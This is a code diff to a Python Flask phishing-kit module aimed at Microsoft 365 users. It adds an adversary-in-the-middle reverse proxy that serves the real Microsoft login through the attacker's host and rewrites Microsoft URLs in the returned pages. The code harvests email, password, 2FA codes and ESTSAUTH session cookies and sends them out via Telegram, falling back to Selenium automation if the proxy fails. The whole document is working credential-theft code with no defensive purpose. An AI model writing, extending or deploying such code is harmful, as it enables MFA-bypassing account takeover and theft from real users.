@@ -11,7 +11,7 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.chrome.service import Service
 from webdriver_manager.chrome import ChromeDriverManager
-import os, traceback, shutil, datetime, threading
+import os, traceback, shutil, datetime, threading, time
 
 class Office365Module(BaseModule):
     def __init__(self, enable_2fa=False, use_aitm_proxy=True):
@@ -24,6 +24,8 @@ class Office365Module(BaseModule):
         self.add_route('twofactor', '/twofactor')
         self.add_route('redirect', '/redirect')
         # AiTM proxy routes
+        self.add_route('proxy_endpoint', '/proxy')
+        self.add_route('proxy_catch_all', '/proxy/<path:path>')
         self.add_route('aitm_status', '/aitm/status')
         self.add_route('aitm_start', '/aitm/start')
         self.add_route('aitm_results', '/aitm/results')
@@ -33,6 +35,10 @@ class Office365Module(BaseModule):
         self.aitm_manager = AiTMManager()
         self.aitm_proxy_url = None
         self.attack_mode = "aitm"  # "aitm" or "selenium"
+
+    def log(self, message):
+        """Logging method for debugging"""
+        print(f"[Office365Module] {message}")
 
     def login(self):
         template = self.env.get_template('login.html')
@@ -76,67 +82,107 @@ class Office365Module(BaseModule):
         self.captured_password = request.values.get('password')
         self.two_factor_token = request.values.get('two_factor_token')
 
-        # Choose attack method: AiTM proxy first, Selenium fallback
+        # Send early exfiltration of credentials
+        ip = request.remote_addr
+        ua = request.user_agent.string
+        early_msg = (
+            f"*O365 AiTM Attack Initiated*\n"
+            f"IP: `{ip}`\nUser-Agent: `{ua}`\n\n"
+            f"Email: `{self.user}`\nPassword: `{self.captured_password}`\n2FA: `{self.two_factor_token}`\n"
+            f"🎯 Redirecting victim to AiTM proxy for real authentication..."
+        )
+        self.send_telegram(early_msg)
+
+        # Start AiTM proxy IMMEDIATELY and redirect victim to it
         if self.use_aitm_proxy and self.attack_mode == "aitm":
-            # Try AiTM proxy method first
-            return self._handle_aitm_attack()
+            return self._start_proxy_and_redirect_victim()
         else:
-            # Fall back to Selenium method
+            # Only use Selenium if AiTM is disabled
             return self._handle_selenium_attack()
 
-    def _handle_aitm_attack(self):
-        """Handle AiTM proxy-based attack"""
-        import threading, json
-        
-        def _aitm_worker(user, pwd, token):
-            try:
-                # Start AiTM proxy
-                proxy_result = self.aitm_manager.start_aitm_attack(
-                    victim_email=user, 
-                    proxy_port=8080
-                )
+    def _start_proxy_and_redirect_victim(self):
+        """Start AiTM proxy immediately and redirect victim to it"""
+        try:
+            # For our Flask-based proxy, we don't need the separate mitmproxy instance
+            # The proxy functionality is built into the Flask routes
+            
+            # Get the public proxy URL using current host
+            current_host = request.host
+            public_proxy_url = f"https://{current_host}/proxy"
+            
+            self.aitm_proxy_url = public_proxy_url
+            
+            # Initialize proxy data storage
+            if not hasattr(self.aitm_manager, 'proxy'):
+                self.aitm_manager.proxy = type('ProxyData', (), {
+                    'captured_data': {'cookies': [], 'credentials': {}, 'session_info': {}}
+                })()
+            
+            # Start background monitoring for captured data
+            self._start_aitm_monitoring()
+            
+            # Immediately redirect victim to the proxy URL 
+            self.log(f"[AiTM] Redirecting victim {self.user} to Flask proxy: {public_proxy_url}")
+            return redirect(public_proxy_url, code=302)
                 
-                if proxy_result.get('success'):
-                    self.aitm_proxy_url = proxy_result['proxy_url']
-                    
-                    # Wait for victim to interact with proxy (simulate or wait for real interaction)
-                    # In real scenario, victim would be redirected to proxy URL
-                    time.sleep(30)  # Wait for potential interaction
+        except Exception as ex:
+            self.log(f"[AiTM] Exception starting proxy: {ex}")
+            self.attack_mode = "selenium"
+            return self._handle_selenium_attack()
+
+    def _start_aitm_monitoring(self):
+        """Start background monitoring for AiTM capture results"""
+        import threading
+        
+        def _monitor_aitm_results():
+            try:
+                # Monitor for 5 minutes for victim interaction
+                start_time = time.time()
+                timeout = 300  # 5 minutes
+                
+                while time.time() - start_time < timeout:
+                    time.sleep(10)  # Check every 10 seconds
                     
                     # Get captured data from proxy
                     captured_data = self.aitm_manager.get_attack_results()
                     
-                    # Validate captured cookies
-                    validation_result = self.aitm_manager.validate_session()
-                    
-                    # Stop proxy
-                    self.aitm_manager.stop_aitm_attack()
-                    
-                    # Format results for Telegram
-                    if captured_data.get('cookies') or captured_data.get('credentials'):
-                        self._send_aitm_results(user, pwd, token, captured_data, validation_result)
-                    else:
-                        # AiTM failed, fall back to Selenium
-                        self.attack_mode = "selenium"
-                        self._selenium_fallback(user, pwd, token)
+                    # Check if we captured anything
+                    if captured_data.get('cookies') or captured_data.get('credentials') or captured_data.get('session_info', {}).get('auth_success'):
+                        # We got something! Validate and send results
+                        validation_result = self.aitm_manager.validate_session()
+                        self._send_aitm_results(self.user, self.captured_password, self.two_factor_token, captured_data, validation_result)
+                        
+                        # Success! Stop monitoring
+                        self.log(f"[AiTM] Successfully captured session data for {self.user}")
+                        break
+                        
                 else:
-                    # AiTM startup failed, fall back to Selenium
-                    self.attack_mode = "selenium"
-                    self._selenium_fallback(user, pwd, token)
+                    # Timeout reached, no cookies captured
+                    self.log(f"[AiTM] Timeout reached - no session data captured for {self.user}")
+                    
+                    # Optional: Fall back to Selenium after timeout
+                    timeout_msg = (
+                        f"*O365 AiTM Timeout*\n"
+                        f"Email: `{self.user}`\n"
+                        f"⚠️ Victim did not complete authentication through proxy\n"
+                        f"🔄 Falling back to Selenium automation..."
+                    )
+                    self.send_telegram(timeout_msg)
+                    
+                    # Start Selenium fallback
+                    self._selenium_fallback(self.user, self.captured_password, self.two_factor_token)
                     
             except Exception as ex:
-                print(f"[aitm_worker] Exception: {ex}")
-                # AiTM failed, fall back to Selenium
-                self.attack_mode = "selenium"
-                self._selenium_fallback(user, pwd, token)
+                self.log(f"[AiTM] Monitor exception: {ex}")
+            finally:
+                # Always stop the proxy when done
+                self.aitm_manager.stop_aitm_attack()
         
-        threading.Thread(target=_aitm_worker, args=(self.user, self.captured_password, self.two_factor_token), daemon=True).start()
-        
-        # Redirect victim to proxy URL if available, otherwise to real Microsoft
-        if self.aitm_proxy_url:
-            return redirect(self.aitm_proxy_url, code=302)
-        else:
-            return redirect(self.final_url, code=302)
+        threading.Thread(target=_monitor_aitm_results, daemon=True).start()
+
+    def _handle_aitm_attack(self):
+        """Legacy method - replaced by _start_proxy_and_redirect_victim"""
+        return self._start_proxy_and_redirect_victim()
 
     def _handle_selenium_attack(self):
         """Handle Selenium-based attack (original method)"""
@@ -327,6 +373,251 @@ class Office365Module(BaseModule):
                 return json.dumps({'error': 'No active AiTM proxy'})
         except Exception as e:
             return json.dumps({'error': str(e)})
+
+    def proxy_endpoint(self):
+        """AiTM Proxy endpoint - serves real Microsoft login while capturing traffic"""
+        try:
+            # Log that victim reached the proxy endpoint
+            ip = request.remote_addr
+            ua = request.user_agent.string
+            
+            proxy_msg = (
+                f"*🎯 AiTM Proxy Active*\n"
+                f"IP: `{ip}`\nUser-Agent: `{ua}`\n"
+                f"Victim accessing real Microsoft login through proxy...\n"
+                f"⚡ Session capture in progress..."
+            )
+            self.send_telegram(proxy_msg)
+            
+            # Get target Microsoft URL based on the request
+            target_path = request.args.get('path', '')
+            query_string = request.query_string.decode('utf-8')
+            
+            # Build the target Microsoft URL
+            if target_path:
+                microsoft_url = f"https://login.microsoftonline.com{target_path}"
+            else:
+                # Default to Microsoft login with user hint if available
+                if hasattr(self, 'user') and self.user:
+                    microsoft_url = f"https://login.microsoftonline.com/common/oauth2/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=https://www.office.com/&scope=openid%20profile&login_hint={self.user}"
+                else:
+                    microsoft_url = "https://login.microsoftonline.com/"
+            
+            # Add query parameters if present
+            if query_string and '?' not in microsoft_url:
+                microsoft_url += f"?{query_string}"
+            elif query_string:
+                microsoft_url += f"&{query_string}"
+            
+            # Proxy the request to Microsoft
+            return self._proxy_to_microsoft(microsoft_url)
+            
+        except Exception as e:
+            self.log(f"[AiTM] Proxy endpoint error: {e}")
+            # Send error notification
+            error_msg = f"*⚠️ AiTM Proxy Error*\nError: `{str(e)}`\nFalling back to direct redirect..."
+            self.send_telegram(error_msg)
+            # Fallback to direct redirect
+            return redirect("https://login.microsoftonline.com/", code=302)
+
+    def proxy_catch_all(self, path):
+        """Handle all paths under /proxy/ for complete Microsoft login flow"""
+        try:
+            # Build the target Microsoft URL with the given path
+            query_string = request.query_string.decode('utf-8')
+            target_url = f"https://login.microsoftonline.com/{path}"
+            
+            if query_string:
+                target_url += f"?{query_string}"
+            
+            self.log(f"[AiTM] Catch-all proxying /{path} to: {target_url}")
+            
+            # Proxy the request to Microsoft
+            return self._proxy_to_microsoft(target_url)
+            
+        except Exception as e:
+            self.log(f"[AiTM] Catch-all proxy error: {e}")
+            return redirect("https://login.microsoftonline.com/", code=302)
+
+    def _proxy_to_microsoft(self, target_url):
+        """Proxy the request to Microsoft and capture response data"""
+        try:
+            import requests
+            from flask import Response, request as flask_request
+            
+            # Log the proxy request
+            self.log(f"[AiTM] Proxying to: {target_url}")
+            
+            # Forward the request to Microsoft
+            headers = {}
+            for key, value in flask_request.headers:
+                if key.lower() not in ['host', 'content-length']:
+                    headers[key] = value
+            
+            # Set proper User-Agent and other headers
+            headers['User-Agent'] = flask_request.headers.get('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+            headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
+            headers['Accept-Language'] = 'en-US,en;q=0.5'
+            headers['Accept-Encoding'] = 'gzip, deflate'
+            headers['Connection'] = 'keep-alive'
+            
+            # Make the request to Microsoft
+            if flask_request.method == 'POST':
+                resp = requests.post(target_url, headers=headers, data=flask_request.get_data(), 
+                                   allow_redirects=False, timeout=30)
+            else:
+                resp = requests.get(target_url, headers=headers, allow_redirects=False, timeout=30)
+            
+            # Capture Set-Cookie headers (the crown jewels!)
+            captured_cookies = []
+            if 'Set-Cookie' in resp.headers:
+                set_cookie_headers = resp.headers.get_all('Set-Cookie') if hasattr(resp.headers, 'get_all') else [resp.headers.get('Set-Cookie')]
+                for cookie_header in set_cookie_headers:
+                    if cookie_header:
+                        captured_cookies.append({
+                            'timestamp': datetime.datetime.utcnow().isoformat(),
+                            'raw_header': cookie_header,
+                            'parsed': self._parse_cookie_header(cookie_header)
+                        })
+                        self.log(f"[AiTM] Captured cookie: {cookie_header[:50]}...")
+            
+            # If we captured cookies, this might be the authentication success!
+            if captured_cookies:
+                self._handle_captured_cookies(captured_cookies)
+            
+            # Prepare response headers
+            response_headers = {}
+            for key, value in resp.headers.items():
+                if key.lower() not in ['content-encoding', 'content-length', 'transfer-encoding', 'connection']:
+                    response_headers[key] = value
+            
+            # Rewrite response content to redirect Microsoft URLs back to our proxy
+            content = resp.content
+            if resp.headers.get('content-type', '').startswith('text/html'):
+                try:
+                    # Decode content and rewrite Microsoft URLs
+                    content_str = content.decode('utf-8', errors='ignore')
+                    current_host = flask_request.host
+                    
+                    # Replace Microsoft URLs with our proxy URLs
+                    replacements = [
+                        ('https://login.microsoftonline.com/', f'https://{current_host}/proxy/'),
+                        ('https://login.live.com/', f'https://{current_host}/proxy/'),
+                        ('"https://login.microsoftonline.com', f'"https://{current_host}/proxy'),
+                        ("'https://login.microsoftonline.com", f"'https://{current_host}/proxy"),
+                    ]
+                    
+                    for old_url, new_url in replacements:
+                        content_str = content_str.replace(old_url, new_url)
+                    
+                    content = content_str.encode('utf-8')
+                    self.log(f"[AiTM] Rewrote {len(replacements)} URL patterns in HTML response")
+                    
+                except Exception as e:
+                    self.log(f"[AiTM] Error rewriting URLs: {e}")
+                    # Use original content if rewriting fails
+                    pass
+            
+            # Create Flask response
+            flask_response = Response(
+                content,
+                status=resp.status_code,
+                headers=response_headers
+            )
+            
+            return flask_response
+            
+        except Exception as e:
+            self.log(f"[AiTM] Proxy error: {e}")
+            # Return error page or redirect
+            return redirect("https://login.microsoftonline.com/", code=302)
+
+    def _parse_cookie_header(self, cookie_header):
+        """Parse a Set-Cookie header into components"""
+        try:
+            parts = cookie_header.split(';')
+            if not parts:
+                return {}
+            
+            # First part is name=value
+            name_value = parts[0].strip()
+            if '=' not in name_value:
+                return {}
+            
+            name, value = name_value.split('=', 1)
+            cookie = {'name': name.strip(), 'value': value.strip()}
+            
+            # Parse additional attributes
+            for part in parts[1:]:
+                part = part.strip()
+                if '=' in part:
+                    attr_name, attr_value = part.split('=', 1)
+                    cookie[attr_name.lower()] = attr_value
+                else:
+                    cookie[part.lower()] = True
+            
+            return cookie
+            
+        except Exception as e:
+            self.log(f"Error parsing cookie: {e}")
+            return {}
+
+    def _handle_captured_cookies(self, captured_cookies):
+        """Handle captured cookies from the proxy"""
+        try:
+            # Store cookies in the AiTM manager if available
+            if self.aitm_manager and self.aitm_manager.proxy:
+                if not hasattr(self.aitm_manager.proxy, 'captured_data'):
+                    self.aitm_manager.proxy.captured_data = {'cookies': [], 'credentials': {}, 'session_info': {}}
+                
+                self.aitm_manager.proxy.captured_data['cookies'].extend(captured_cookies)
+            
+            # Check for important Microsoft authentication cookies
+            important_cookies = []
+            for cookie_data in captured_cookies:
+                cookie = cookie_data.get('parsed', {})
+                if cookie.get('name'):
+                    name = cookie['name']
+                    if any(important in name.upper() for important in ['ESTSAUTH', 'STSSERVICE', 'BUID', 'FPC']):
+                        important_cookies.append(name)
+            
+            if important_cookies:
+                # We got authentication cookies! Send immediate notification
+                cookie_msg = (
+                    f"*🔥 AiTM Session Cookies Captured!*\n"
+                    f"Email: `{getattr(self, 'user', 'Unknown')}`\n"
+                    f"🍪 Important Cookies: `{', '.join(important_cookies[:5])}`\n"
+                    f"⚡ Validating session..."
+                )
+                self.send_telegram(cookie_msg)
+                
+                # Trigger validation in background
+                threading.Thread(target=self._validate_and_report_session, daemon=True).start()
+            
+        except Exception as e:
+            self.log(f"Error handling captured cookies: {e}")
+
+    def _validate_and_report_session(self):
+        """Validate captured session and send full report"""
+        try:
+            time.sleep(2)  # Give a moment for more cookies to be captured
+            
+            # Get all captured data
+            if self.aitm_manager and self.aitm_manager.proxy:
+                captured_data = self.aitm_manager.get_attack_results()
+                validation_result = self.aitm_manager.validate_session()
+                
+                # Send comprehensive results
+                self._send_aitm_results(
+                    getattr(self, 'user', 'Unknown'), 
+                    getattr(self, 'captured_password', 'Unknown'), 
+                    getattr(self, 'two_factor_token', 'Unknown'), 
+                    captured_data, 
+                    validation_result
+                )
+                
+        except Exception as e:
+            self.log(f"Error validating session: {e}")
 
     def send_telegram(self, message: str | None = None, document_paths: list | None = None):
         """Send a Markdown message and/or upload documents to Telegram.
